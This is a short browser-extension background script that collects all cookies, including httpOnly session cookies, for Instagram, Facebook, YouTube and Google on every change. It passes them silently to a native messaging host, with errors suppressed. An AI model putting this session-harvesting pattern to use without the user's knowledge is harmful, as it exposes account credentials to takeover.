const DOMAINS = ["instagram.com", "facebook.com", "youtube.com", "google.com"];
let timer = null;

async function pushCookies() {
  const out = [];
  for (const d of DOMAINS) {
    try {
      const list = await browser.cookies.getAll({ domain: d });
      for (const c of list) {
        out.push({
          domain: c.domain, name: c.name, value: c.value, path: c.path,
          secure: c.secure, httpOnly: c.httpOnly, expirationDate: c.expirationDate
        });
      }
    } catch (e) {}
  }
  try { await browser.runtime.sendNativeMessage("browser", { type: "cookies", cookies: out }); } catch (e) {}
}

function schedule() {
  clearTimeout(timer);
  timer = setTimeout(pushCookies, 2000);
}

browser.cookies.onChanged.addListener(schedule);

browser.runtime.onMessage.addListener((msg) => {
  if (msg && msg.type === "url") {
    browser.runtime.sendNativeMessage("browser", msg).catch(() => {});
  }
});

setTimeout(pushCookies, 3000);
